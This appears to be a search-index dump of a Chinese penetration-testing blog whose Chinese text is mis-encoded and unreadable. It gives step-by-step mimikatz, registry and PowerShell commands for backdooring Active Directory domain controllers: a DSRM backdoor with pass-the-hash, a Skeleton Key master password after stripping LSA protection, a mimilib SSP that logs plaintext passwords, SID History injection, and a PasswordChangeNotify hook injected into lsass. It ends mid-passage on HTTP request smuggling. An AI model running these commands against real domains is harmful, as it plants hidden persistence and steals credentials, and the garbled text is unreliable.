ç”¨æˆ· = DSRM è´¦å· 2.1.1 ä¿®æ”¹ DSRM å¯†ç çš„æ–¹æ³• å¾®è½¯å…¬å¸ƒäº†ä¿®æ”¹DSRMå¯†ç çš„æ–¹æ³•ã€‚åœ¨åŸŸæ§ä¸Šæ‰“å¼€å‘½ä»¤è¡Œç¯å¢ƒï¼Œå¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š # NTDSUTILï¼šæ‰“å¼€ntdsutil set DSRM password # ï¼šä¿®æ”¹DSRMçš„å¯†ç  reset password on server null # åœ¨å½“å‰åŸŸæ§åˆ¶å™¨ä¸Šé‡ç½®DSRMçš„å¯†ç  # q(ç¬¬1æ¬¡)ï¼šé€€å‡ºDSRMå¯†ç è®¾ç½®æ¨¡å¼ # q(ç¬¬2æ¬¡)ï¼šé€€å‡ºntdsutil å¦‚æœåŸŸæ§åˆ¶å™¨çš„ç³»ç»Ÿç‰ˆæœ¬ä¸º Windows Server 2008(å·²å®‰è£…KB961320)åŠä»¥ä¸Šï¼Œå¯ä»¥å°† DSRM å¯†ç åŒæ­¥ä¸ºå·²å­˜åœ¨çš„åŸŸè´¦å·å¯†ç ã€‚ NTDSUTIL # æ‰“å¼€ntdsutil set DSRM password # ä¿®æ”¹ DSRM çš„å¯†ç  sync from domain account # åŸŸç”¨æˆ·åå­—ï¼šä½¿DSRMçš„å¯†ç å’ŒæŒ‡å®šåŸŸç”¨æˆ·çš„å¯†ç åŒæ­¥ # q(ç¬¬1æ¬¡) é€€å‡ºDSRMå¯†ç è®¾ç½®æ¨¡å¼ # q(ç¬¬2æ¬¡) é€€å‡ºntdsutil 2.1.2 è®¾ç½® DSRM åé—¨ 2.1.2.1 ç›´æ¥ä¸º DSRM è®¾ç½®æ–°å¯†ç  ä¸º DSRM è®¾ç½®æ–°å¯†ç ï¼Œè·å– NTLM å“ˆå¸Œå€¼ï¼Œä¿®æ”¹ DSRM ç™»å½•æ–¹å¼ï¼Œä½¿ç”¨å“ˆå¸Œä¼ é€’æ”»å‡»åŸŸæ§ æŸ¥çœ‹ SAM æ–‡ä»¶ä¸­æœ¬åœ°ç®¡ç†å‘˜ administrator çš„ NTLM å“ˆå¸Œå€¼ privilege::debug token::elevate lsadump::sam ä¿®æ”¹ DSRM çš„ç™»å½•æ–¹å¼ DSRM æœ‰ä¸‰ç§ç™»å½•æ–¹å¼ï¼Œå…·ä½“å¦‚ä¸‹ï¼š 0ï¼šé»˜è®¤å€¼ï¼Œåªæœ‰å½“åŸŸæ§åˆ¶å™¨é‡å¯å¹¶è¿›å…¥ DSRM æ¨¡å¼æ—¶ï¼Œæ‰å¯ä»¥ä½¿ç”¨ DSRM ç®¡ç†å‘˜è´¦å· 1ï¼šåªæœ‰å½“æœ¬åœ° ADã€DS æœåŠ¡åœæ­¢æ—¶ï¼Œæ‰å¯ä»¥ä½¿ç”¨ DSRM ç®¡ç†å‘˜è´¦å·ç™»å½•åŸŸæ§åˆ¶å™¨ 2ï¼šåœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œéƒ½å¯ä»¥ä½¿ç”¨ DSRM ç®¡ç†å‘˜è´¦å·ç™»å½•åŸŸæ§åˆ¶å™¨ åœ¨ Windows Server 2000 ä»¥åçš„ç‰ˆæœ¬æ“ä½œç³»ç»Ÿä¸­ï¼Œå¯¹ DSRM ä½¿ç”¨æ§åˆ¶å°ç™»å½•åŸŸæ§åˆ¶å™¨è¿›è¡Œäº†é™åˆ¶ã€‚å¦‚æœè¦ä½¿ç”¨ DSRM è´¦å·é€šè¿‡ç½‘ç»œç™»å½•åŸŸæ§åˆ¶å™¨ï¼Œéœ€è¦å°†è¯¥å€¼è®¾ç½®ä¸º 2ã€‚è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ PowerShell è¿›è¡Œæ›´æ”¹ã€‚ New-ItemProperty \"hklm:\\system\\currentcontrolset\\control\\lsa\\\" -name \"dsrmadminlogonbehavior\" -value 2 -propertyType DWORD ä½¿ç”¨æœ¬åœ° administrator è´¦å·å“ˆå¸Œä¼ é€’æ”»å‡»åŸŸæ§ privilege::debug sekurlsa::pth /domain:DC /user:administrator /ntlm:0f0de1776a3bf0f2a29b6f15b6fcba42 2.1.2.2 å°† DSRM çš„å¯†ç åŒæ­¥ä¸ºä¸€ä¸ªåŸŸç”¨æˆ·çš„å·²çŸ¥å¯†ç  å…¶ä½™æ–¹æ³•åŒä¸Šã€‚ ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:2:1","tags":["å†…ç½‘æ¸—é€","æƒé™ç»´æŒ"],"title":"æƒé™ç»´æŒ","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.2 Skeleton Key ä¸‡èƒ½å¯†ç  Skeleton Key è¢«å®‰è£…åœ¨ 64 ä½çš„åŸŸæ§æœåŠ¡å™¨ä¸Š æ”¯æŒ Windows Server2003 â€” Windows Server2012 R2 èƒ½å¤Ÿè®©æ‰€æœ‰åŸŸç”¨æˆ·ä½¿ç”¨åŒä¸€ä¸ªä¸‡èƒ½å¯†ç è¿›è¡Œç™»å½• ç°æœ‰çš„æ‰€æœ‰åŸŸç”¨æˆ·ä½¿ç”¨åŸå¯†ç ä»èƒ½ç»§ç»­ç™»å½• é‡å¯åå¤±æ•ˆ ä½¿ç”¨ Skeleton Key æ”»å‡»æ—¶ï¼ŒNTLMã€Kerberos ä¸¤ç§èº«ä»½éªŒè¯æ–¹æ³•éƒ½ä¼šè¢«ç¯¡æ”¹ã€‚ ä¾‹å¦‚ï¼Œåœ¨NTLMèº«ä»½éªŒè¯æœŸé—´ï¼Œå·²æ³¨å…¥ LSASS è¿›ç¨‹ä¸­çš„ä¸»å¯†ç å“ˆå¸Œå°†ä¸ä¼šä¸SAMæ•°æ®åº“è¿›è¡Œæ¯”è¾ƒï¼Œè€Œå°†ä¸ Skeleton Key å“ˆå¸Œè¿›è¡Œæ¯”è¾ƒï¼Œå› æ­¤ï¼Œèº«ä»½éªŒè¯å°†æˆåŠŸã€‚ Kerberos åŠ å¯†ä¹Ÿå°†é™çº§ä¸ºä¸æ”¯æŒ Saltï¼ˆRC4_HMAC_MD5ï¼‰çš„ç®—æ³•ï¼Œå¹¶ä¸”ä»æ´»åŠ¨ç›®å½•ä¸­æ£€ç´¢åˆ°çš„å“ˆå¸Œå°†æ›¿æ¢ä¸º Skeleton Key å“ˆå¸Œã€‚ å› æ­¤ï¼Œä¸»å¯†ç çš„å“ˆå¸Œå€¼å°†å§‹ç»ˆåœ¨æœåŠ¡å™¨ç«¯è¿›è¡ŒéªŒè¯ï¼Œå¹¶ä¸”ä¸¤ç§æ–¹æ³•çš„èº«ä»½éªŒè¯éƒ½å°†æˆåŠŸã€‚ 2.2.1 åœ¨åŸŸæ§ä¸Šå®‰è£… Skeleton Key mimikatz å‘½ä»¤ï¼š privilege::debug misc::skeleton 2.2.2 åœ¨åŸŸå†…ä¸»æœºä½¿ç”¨ Skeleton Key ç™»å½• net use \\\\dc.pentest.domain mimikatz /user:administrator@pentest.domain dir \\\\DC.pentest.domain\\c$ 2.2.3 æƒé™æµ‹è¯• ä½¿ç”¨åŸŸå†…ä¸å­˜åœ¨çš„ç”¨æˆ· + Skeleton Key ç™»å½• æ— æ³•ç™»å½• ä½¿ç”¨åŸŸå†…æ™®é€šæƒé™ç”¨æˆ·ç™»å½• ä½¿ç”¨åŸŸå†…æ™®é€šæƒé™ç”¨æˆ·æ— æ³•è®¿é—®åŸŸæ§ ç»“è®ºï¼š Skeleton Key åªæ˜¯ç»™æ‰€æœ‰è´¦æˆ·æ·»åŠ äº†ä¸€ä¸ªä¸‡èƒ½å¯†ç ï¼Œæ— æ³•ä¿®æ”¹è´¦æˆ·çš„æƒé™ 2.2.4 LSA Protection å¾®è½¯åœ¨ 2014 å¹´ 3 æœˆ 12 æ—¥æ·»åŠ äº† LSA ä¿æŠ¤ç­–ç•¥ï¼Œç”¨æ¥é˜²æ­¢å¯¹è¿›ç¨‹ lsass.exe çš„ä»£ç æ³¨å…¥ï¼Œè¿™æ ·ä¸€æ¥å°±æ— æ³•ä½¿ç”¨ mimikatz å¯¹ lsass.exe è¿›è¡Œæ³¨å…¥ï¼Œç›¸å…³æ“ä½œä¹Ÿä¼šå¤±è´¥ã€‚ é€‚ç”¨ç³»ç»Ÿï¼š Windows 8.1 Windows Server 2012 R2 ä½¿ç”¨ Windows Server 2012 è¿›è¡Œæµ‹è¯• 2.2.4.1 é…ç½® LSA Protection æ³¨å†Œè¡¨ä½ç½®ï¼š HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa æ–°å»º DWORD å€¼ï¼Œåç§°ä¸ºï¼šRunAsPPL ï¼Œæ•°å€¼ä¸ºåå…­è¿›åˆ¶çš„ 00000001 æ·»åŠ å®Œæ¯•åï¼Œéœ€è¦é‡å¯ç³»ç»Ÿ 2.2.4.2 æµ‹è¯• LSA Protection 2.2.5 ç»•è¿‡ LSA Protection Mimikatz å‘½ä»¤ï¼š privilege::debug !+ !processprotect /process:lsass.exe /remove misc::skeleton ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:2:2","tags":["å†…ç½‘æ¸—é€","æƒé™ç»´æŒ"],"title":"æƒé™ç»´æŒ","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.3 SSP åŠ«æŒ SSP SSP (Security Support Provider)ï¼Œæ˜¯ windows æ“ä½œç³»ç»Ÿå®‰å…¨æœºåˆ¶çš„æä¾›è€…ã€‚ç®€å•çš„è¯´ï¼ŒSSP å°±æ˜¯ DLL æ–‡ä»¶ï¼Œä¸»è¦ç”¨äº windows æ“ä½œç³»ç»Ÿçš„èº«ä»½è®¤è¯åŠŸèƒ½ï¼Œä¾‹å¦‚ NTLMã€ Kerberosã€Negotiateã€Secure Channel(Schannel)ã€ Digestã€Credential(CredSSP) SSPI SSPI(Security Support Provider Interface)æ˜¯ windows æ“ä½œç³»ç»Ÿåœ¨æ‰§è¡Œè®¤è¯æ“ä½œæ—¶ä½¿ç”¨çš„ API æ¥å£ã€‚å¯ä»¥è¯´ SSPI å°±æ˜¯ SSP çš„ API æ¥å£ã€‚ LSA Local Security Authorityï¼Œç”¨äºèº«ä»½è®¤è¯ï¼Œå¸¸è§è¿›ç¨‹ä¸º lsass.exe å¦‚æœè·å¾—ç›®æ ‡ç³»ç»Ÿ system æƒé™ï¼Œå¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡ŒæŒä¹…åŒ–æ“ä½œã€‚å…¶ä¸»è¦åŸç†æ˜¯ï¼šLSA(Local Security Authority)ç”¨äºèº«ä»½éªŒè¯ã€‚Isass.exe ä½œä¸º windows çš„ç³»ç»Ÿè¿›ç¨‹ï¼Œç”¨äºæœ¬åœ°å®‰å…¨å’Œç™»å½•ç­–ç•¥ï¼› åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ï¼ŒSSP å°†è¢«åŠ è½½åˆ° lsass.exe è¿›ç¨‹ä¸­ã€‚ä½†æ˜¯ï¼Œå‡å¦‚æ”»å‡»è€…å¯¹ LSA è¿›è¡Œäº†æ‰©å±•ï¼Œè‡ªå®šä¹‰äº†æ¶æ„çš„ DLL æ–‡ä»¶åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶å°†å…¶åŠ è½½åˆ° lsass.exe è¿›ç¨‹ä¸­ï¼Œå°±èƒ½å¤Ÿè·å– lsass.exe è¿›ç¨‹ä¸­çš„æ˜æ–‡å¯†ç ã€‚è¿™æ ·å³ä½¿ç”¨æˆ·æ›´æ”¹å¯†ç å¹¶é‡æ–°ç™»å½•ï¼Œæ”»å‡»è€…ä¾ç„¶å¯ä»¥è·å¾—è¯¥è´¦å·çš„æ–°å¯†ç ã€‚ 2.3.1 mimilib SSP ç”±äºæ˜¯é’ˆå¯¹æœ¬æœºçš„ LSA è¿›è¡Œ Patchï¼Œå› æ­¤æœ¬æ–¹æ³•åªé’ˆå¯¹åœ¨å½“å‰æœºå™¨ä¸Šç™»å½•çš„ç”¨æˆ·èµ·ä½œç”¨ 2.3.1.1 é€šè¿‡å†…å­˜æ›´æ–°ç•™åé—¨ï¼ˆä¸´æ—¶ï¼‰ privilege::debug misc::memssp 2.3.1.2 é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨ç•™åé—¨ï¼ˆæ°¸ä¹…ï¼‰ ä½¿ç”¨æ­¤æ–¹æ³•å³ä½¿ç³»ç»Ÿé‡å¯ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ°æŒä¹…åŒ–çš„æ•ˆæœ æ·»åŠ  mimilib.dll åˆ°åŸŸæ§ C:\\windows\\system32 ä¸‹ copy mimilib.dll %systemroot%\\system32 æ³¨ï¼š 64 ä½ç³»ç»Ÿè¦ç”¨ 64 ä½çš„ mimilib.dllï¼Œ32 ä½çš„ä¼šå¤±è´¥ è®¾ç½® SSP reg query hklm\\system\\currentcontrolset\\control\\lsa\\ /v \"Security Packages\" reg add \"hklm\\system\\currentcontrolset\\control\\lsa\\\" /v \"Security Packages\" /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /t REG_MULTI_SZ é‡å¯ç³»ç»Ÿ åŸŸæ§é‡å¯ååœ¨ c:\\windows\\system32 å¯çœ‹åˆ°æ–°ç”Ÿæˆçš„æ–‡ä»¶ kiwissp.log ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:2:3","tags":["å†…ç½‘æ¸—é€","æƒé™ç»´æŒ"],"title":"æƒé™ç»´æŒ","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.4 SID History åŸŸåé—¨ æ¯ä¸ªç”¨æˆ·å¸å·éƒ½æœ‰ä¸€ä¸ªå…³è”çš„å®‰å…¨æ ‡è¯†ç¬¦ï¼ˆç®€ç§°SIDï¼‰ï¼ŒSID ç”¨äºè·Ÿè¸ªå®‰å…¨ä¸»ä½“åœ¨è®¿é—®èµ„æºæ—¶çš„å¸æˆ·ä¸è®¿é—®æƒé™ã€‚ä¸ºäº†æ”¯æŒ AD è¿ç§»ï¼Œå¾®è½¯è®¾è®¡äº† SID History å±æ€§ï¼ŒSID History å…è®¸å¦ä¸€ä¸ªå¸æˆ·çš„è®¿é—®è¢«æœ‰æ•ˆçš„å…‹éš†åˆ°å¦ä¸€ä¸ªå¸æˆ·ã€‚é€šè¿‡ SID History å¯è®©ç”¨æˆ·æ‹¥æœ‰ä¸åŒèº«ä»½çš„æƒé™ï¼Œåœ¨å•åŸŸä¸­åŒæ ·æœ‰æ•ˆã€‚ SID History æ˜¯åœ¨åŸŸè¿ç§»è¿‡ç¨‹ä¸­éœ€è¦ä½¿ç”¨çš„ä¸€ä¸ªå±æ€§ã€‚ å¦‚æœå°† A åŸŸä¸­çš„åŸŸç”¨æˆ·è¿ç§»åˆ° B åŸŸä¸­ï¼Œé‚£ä¹ˆåœ¨ B åŸŸä¸­è¯¥ç”¨æˆ·çš„ SID ä¼šéšä¹‹æ”¹å˜ï¼Œè¿›è€Œå½±å“è¿ç§»åç”¨æˆ·çš„æƒé™ï¼Œå¯¼è‡´è¿ç§»åçš„ç”¨æˆ·ä¸èƒ½è®¿é—®æœ¬æ¥å¯ä»¥è®¿é—®çš„èµ„æºã€‚ SID History çš„ä½œç”¨æ˜¯åœ¨åŸŸè¿ç§»è¿‡ç¨‹ä¸­ä¿æŒåŸŸç”¨æˆ·çš„è®¿é—®æƒé™ï¼Œå³å¦‚æœè¿ç§»åç”¨æˆ·çš„ SID æ”¹å˜äº†ï¼Œç³»ç»Ÿä¼šå°†å…¶åŸæ¥çš„ SID æ·»åŠ åˆ°è¿ç§»åç”¨æˆ·çš„ SID History å±æ€§ä¸­ï¼Œä½¿è¿ç§»åçš„ç”¨æˆ·ä¿æŒåŸæœ‰æƒé™ã€èƒ½å¤Ÿè®¿é—®å…¶åŸæ¥å¯ä»¥è®¿é—®çš„èµ„æºã€‚ ä½¿ç”¨ mimikatzï¼Œå¯ä»¥å°† SID History å±æ€§æ·»åŠ åˆ°åŸŸä¸­ä»»æ„ç”¨æˆ·çš„ SID History å±æ€§ä¸­ã€‚åœ¨å®æˆ˜ä¸­ï¼Œå¦‚æœè·å¾—äº†åŸŸç®¡ç†å‘˜æƒé™ï¼Œåˆ™å¯ä»¥å°† SID History ä½œä¸ºå®ç°æŒä¹…åŒ–çš„æ–¹æ³•ã€‚ 2.4.1 æ·»åŠ  SID History åé—¨ æ‰“å¼€ä¸€ä¸ªå…·æœ‰åŸŸç®¡ç†å‘˜æƒé™çš„å‘½ä»¤è¡Œçª—å£ï¼Œç„¶åæ‰“å¼€ mimikatzï¼Œå°† administrator çš„ SID æ·»åŠ åˆ° hack ç”¨æˆ·çš„ SID History å±æ€§ä¸­ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ä½¿ç”¨ mimikatz æ³¨å…¥ SID ä¹‹å‰ï¼Œéœ€è¦ä½¿ç”¨ sid::patch å‘½ä»¤ä¿®å¤ NTDS æœåŠ¡ï¼Œå¦åˆ™æ— æ³•å°†é«˜æƒé™çš„ SID æ³¨å…¥ä½æƒé™ç”¨æˆ·çš„ SID History å±æ€§ mimikatz.exe \"privilege::debug\" \"sid::patch\" \"sid::add /new:administrator /sam:test\" \"exit\" # å°† administrator çš„ SID æ·»åŠ åˆ° hack çš„ SID History å±æ€§ä¸­ 2.4.2 æŸ¥çœ‹ SID History Import-Module activedirectory Get-ADUser hack -Properties sidhistory 2.4.3 æ¸…é™¤ SID History mimikatz.exe \"privilege::debug\" \"sid::patch\" \"sid::clear /sam:test\" \"exit\" ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:2:4","tags":["å†…ç½‘æ¸—é€","æƒé™ç»´æŒ"],"title":"æƒé™ç»´æŒ","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"2.5 Hook PasswordChangeNotify 2.5.1 èƒŒæ™¯ åœ¨ä¿®æ”¹åŸŸæ§å¯†ç æ—¶ä¼šè¿›è¡Œå¦‚ä¸‹åŒæ­¥æ“ä½œï¼š å½“ä¿®æ”¹åŸŸæ§å¯†ç æ—¶ï¼ŒLSA é¦–å…ˆè°ƒç”¨ PasswordFileter æ¥åˆ¤æ–­æ–°å¯†ç æ˜¯å¦ç¬¦åˆå¯†ç å¤æ‚åº¦è¦æ±‚ å¦‚æœç¬¦åˆï¼ŒLSA æ¥ç€è°ƒç”¨ PasswordChangeNotify åœ¨ç³»ç»Ÿä¸ŠåŒæ­¥æ›´æ–°å¯†ç  å‡½æ•° PasswordChangeNotify å­˜åœ¨äº rassfm.dll rassfm.dll å¯ç†è§£ä¸º Remote Access Subauthentication dllï¼Œåªå­˜åœ¨äºåœ¨ Server ç³»ç»Ÿä¸‹ï¼Œxpã€win7ã€win8 ç­‰å‡ä¸å­˜åœ¨ 2.5.2 ç‰¹ç‚¹ ä¸éœ€è¦é‡å¯ ä¸éœ€è¦ä¿®æ”¹æ³¨å†Œè¡¨ ç”šè‡³ä¸éœ€è¦åœ¨ç³»ç»Ÿæ”¾ç½®dll 2.5.3 å®ç° 2.5.3.1 Hook DLL ä¸º PasswordChangeNotify åˆ›å»ºä¸€ä¸ª inline Hookï¼Œå°†åˆå§‹å‡½æ•°é‡å®šå‘åˆ° PasswordChangeNotifyHook åœ¨ PasswordChangeNotifyHook ä¸­å®ç°è®°å½•å¯†ç çš„æ“ä½œï¼Œç„¶åé‡æ–°å°†æ§åˆ¶æƒäº¤ç»™ PasswordChangeNotify 2.5.3.2 DLL æ³¨å…¥ åˆ©ç”¨ Powershell tricks ä¸­çš„ Process Injection å°†æˆ‘ä»¬è‡ªå·±ç¼–å†™çš„ dll æ³¨å…¥åˆ° lsass è¿›ç¨‹ï¼Œå®ç° Hook åŠŸèƒ½ https://github.com/3gstudent/Hook-PasswordChangeNotify ç®¡ç†å‘˜æƒé™æ‰§è¡Œï¼š PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1 åœ¨ Server 2012 R2 x64 ä¸‹ï¼Œæ‰‹åŠ¨ä¿®æ”¹åŸŸæ§å¯†ç å åœ¨ C:\\Windows\\Temp ä¸‹å¯ä»¥æ‰¾åˆ° passwords.txtï¼Œå…¶ä¸­è®°å½•äº†æ–°ä¿®æ”¹çš„å¯†ç  ","date":"2020-12-07","objectID":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/:2:5","tags":["å†…ç½‘æ¸—é€","æƒé™ç»´æŒ"],"title":"æƒé™ç»´æŒ","uri":"/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"HTTP è¯·æ±‚èµ°ç§","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/","tags":["æ¸—é€æµ‹è¯•"],"title":"HTTP è¯·æ±‚èµ°ç§","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"HTTP è¯·æ±‚èµ°ç§ ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:0:0","tags":["æ¸—é€æµ‹è¯•"],"title":"HTTP è¯·æ±‚èµ°ç§","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1 å‰è¨€ ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:1:0","tags":["æ¸—é€æµ‹è¯•"],"title":"HTTP è¯·æ±‚èµ°ç§","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.1 Keep-Alive åœ¨ HTTP 1.0 ä¹‹å‰çš„åè®®è®¾è®¡ä¸­ï¼Œå®¢æˆ·ç«¯æ¯è¿›è¡Œä¸€æ¬¡ HTTP è¯·æ±‚ï¼Œå°±éœ€è¦åŒæœåŠ¡å™¨å»ºç«‹ä¸€ä¸ª TCP é“¾æ¥ã€‚è€Œç°ä»£çš„ Web ç½‘ç«™é¡µé¢æ˜¯ç”±å¤šç§èµ„æºç»„æˆçš„ï¼Œæˆ‘ä»¬è¦è·å–ä¸€ä¸ªç½‘é¡µçš„å†…å®¹ï¼Œä¸ä»…è¦è¯·æ±‚ HTML æ–‡æ¡£ï¼Œè¿˜æœ‰ JSã€CSSã€å›¾ç‰‡ç­‰å„ç§å„æ ·çš„èµ„æºï¼Œè¿™æ ·å¦‚æœæŒ‰ç…§ä¹‹å‰çš„åè®®è®¾è®¡ï¼Œå°±ä¼šå¯¼è‡´ HTTP æœåŠ¡å™¨çš„è´Ÿè½½å¼€é”€å¢å¤§ã€‚äºæ˜¯åœ¨ HTTP 1.1 ä¸­ï¼Œå¢åŠ äº† Keep-Alive å’Œ Pipeline è¿™ä¸¤ä¸ªç‰¹æ€§ã€‚ Keep-Alive æ˜¯ä»€ä¹ˆï¼Ÿå°±æ˜¯åœ¨ HTTP è¯·æ±‚ä¸­å¢åŠ ä¸€ä¸ªç‰¹æ®Šçš„è¯·æ±‚å¤´ Connection: Keep-Aliveï¼Œå‘Šè¯‰æœåŠ¡å™¨ï¼Œæ¥æ”¶å®Œè¿™æ¬¡ HTTP è¯·æ±‚åï¼Œä¸è¦å…³é—­ TCP é“¾æ¥ï¼Œåé¢å¯¹ç›¸åŒç›®æ ‡æœåŠ¡å™¨çš„ HTTP è¯·æ±‚ï¼Œé‡ç”¨è¿™ä¸€ä¸ª TCP é“¾æ¥ï¼Œè¿™æ ·åªéœ€è¦è¿›è¡Œä¸€æ¬¡ TCP æ¡æ‰‹çš„è¿‡ç¨‹ï¼Œå¯ä»¥å‡å°‘æœåŠ¡å™¨çš„å¼€é”€ï¼ŒèŠ‚çº¦èµ„æºï¼Œè¿˜èƒ½åŠ å¿«è®¿é—®é€Ÿåº¦ã€‚å½“ç„¶ï¼Œè¿™ä¸ªç‰¹æ€§åœ¨ HTTP 1.1 ä¸­æ˜¯é»˜è®¤å¼€å¯çš„ã€‚ ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:1:1","tags":["æ¸—é€æµ‹è¯•"],"title":"HTTP è¯·æ±‚èµ°ç§","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.2 Pipeline æœ‰äº† Keep-Alive ä¹‹åï¼Œåç»­å°±æœ‰äº†Pipelineï¼Œåœ¨è¿™é‡Œå‘¢ï¼Œå®¢æˆ·ç«¯å¯ä»¥åƒæµæ°´çº¿ä¸€æ ·å‘é€è‡ªå·±çš„ HTTP è¯·æ±‚ï¼Œè€Œä¸éœ€è¦ç­‰å¾…æœåŠ¡å™¨çš„å“åº”ï¼ŒæœåŠ¡å™¨é‚£è¾¹æ¥æ”¶åˆ°è¯·æ±‚åï¼Œéœ€è¦éµå¾ªå…ˆå…¥å…ˆå‡ºæœºåˆ¶ï¼Œå°†è¯·æ±‚å’Œå“åº”ä¸¥æ ¼å¯¹åº”èµ·æ¥ï¼Œå†å°†å“åº”å‘é€ç»™å®¢æˆ·ç«¯ã€‚ç°åœ¨ï¼Œæµè§ˆå™¨é»˜è®¤æ˜¯ä¸å¯ç”¨ Pipeline çš„ï¼Œä½†æ˜¯ä¸€èˆ¬çš„æœåŠ¡å™¨éƒ½æä¾›äº†å¯¹ Pipeline çš„æ”¯æŒã€‚ ","date":"2020-09-15","objectID":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/:1:2","tags":["æ¸—é€æµ‹è¯•"],"title":"HTTP è¯·æ±‚èµ°ç§","uri":"/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1.3 åŸç† åå‘ä»£ç†æœåŠ¡å™¨ä¸åç«¯çš„æºç«™æœåŠ¡å™¨ä¹‹é—´ï¼Œä¼šé‡ç”¨ TCP é“¾æ¥ï¼Œå› ä¸ºä»£ç†æœåŠ¡å™¨ä¸åç«¯çš„æºç«™æœåŠ¡å™¨çš„ IP åœ°å€æ˜¯ç›¸å¯¹å›ºå®šï¼Œä¸åŒç”¨æˆ·çš„è¯·æ±‚é€šè¿‡ä»£ç†æœåŠ¡å™¨ä¸æºç«™æœåŠ¡å™¨å»ºç«‹é“¾æ¥ï¼Œæ‰€ä»¥å°±é¡ºç†æˆç« äº†ã€‚ ä½†æ˜¯ç”±äºä¸¤è€…æœåŠ¡å™¨çš„å®ç°æ–¹å¼ä¸åŒï¼Œå¦‚æœç”¨æˆ·æäº¤æ¨¡ç³Šçš„è¯·æ±‚å¯èƒ½ä»£ç†æœåŠ¡å™¨è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ª HTTP è¯·æ±‚ï¼Œç„¶åå°†å…¶è½¬å‘ç»™äº†åç«¯çš„æºç«™æœåŠ¡å™¨ï¼Œä½†æºç«™æœåŠ¡å™¨ç»è¿‡è§£æå¤„ç†åï¼Œåªè®¤ä¸ºå…¶ä¸­çš„ä¸€éƒ¨åˆ†ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œå‰©ä¸‹çš„é‚£ä¸€éƒ¨åˆ†å°±æ˜¯èµ°ç§çš„è¯·æ±‚äº†ï¼Œè¿™å°±æ˜¯ HTTP èµ°ç§è¯·æ±‚çš„ç”±æ¥ã€‚ HTTP è¯·æ±‚èµ°ç§æ¼æ´çš„åŸå› æ˜¯ç”±äº HTTP è§„èŒƒæä¾›äº†ä¸¤ç§ä¸åŒæ–¹å¼æ¥æŒ‡å®šè¯·æ±‚çš„ç»“æŸä½ç½®ï¼Œå®ƒä»¬æ˜¯ Content-Length æ ‡å¤´å’Œ Transfer-Encoding æ ‡å¤´ï¼ŒContent-Length æ ‡å¤´ç®€å•æ˜äº†ï¼Œå®ƒä»¥å­—èŠ‚ä¸ºå•ä½æŒ‡å®šæ¶ˆæ¯å†…å®¹ä½“çš„é•¿åº¦ã€‚ Transfer-Encoding æ ‡å¤´ç”¨äºæŒ‡å®šæ¶ˆæ¯ä½“ä½¿ç”¨åˆ†å—ç¼–ç ï¼ˆChunked Encodeï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´æ¶ˆæ¯æŠ¥æ–‡ç”±ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®å—ç»„æˆï¼Œæ¯ä¸ªæ•°æ®å—å¤§å°ä»¥å­—èŠ‚ä¸ºå•ä½ï¼ˆåå…­è¿›åˆ¶è¡¨ç¤ºï¼‰ è¡¡é‡ï¼Œåè·Ÿæ¢è¡Œç¬¦ï¼Œç„¶åæ˜¯å—å†…å®¹ï¼Œæœ€é‡è¦çš„æ˜¯ï¼šæ•´ä¸ªæ¶ˆæ¯ä½“ä»¥å¤§å°ä¸º 0 